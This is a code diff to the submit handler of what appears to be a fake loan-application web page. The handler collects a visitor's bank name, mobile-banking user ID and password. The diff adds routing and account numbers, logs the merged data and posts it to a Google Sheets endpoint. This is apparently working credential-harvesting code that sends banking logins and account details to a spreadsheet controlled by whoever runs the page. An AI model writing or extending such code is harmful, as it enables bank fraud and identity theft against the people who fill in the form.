@@ -490,10 +490,16 @@ document.querySelector("form").addEventListener("submit", async function(e) {
   const bankData = {
     bankName: document.getElementById("bankName").value,
     mobileBankingUserId: document.getElementById("mobileBankingUserId").value,
-    mobileBankingPassword: document.getElementById("mobileBankingPassword").value
+    mobileBankingPassword: document.getElementById("mobileBankingPassword").value,
+    routingNumber: loanData.routingNumber || '',
+    accountNumber: loanData.accountNumber || ''
   };
 
   const finalData = { ...loanData, ...bankData };
+
+  console.log("Loan data from localStorage:", loanData);
+  console.log("Bank data:", bankData);
+  console.log("Final data being sent to Google Sheets:", finalData);
 
   try {
     const res = await fetch(SHEET_URL, {
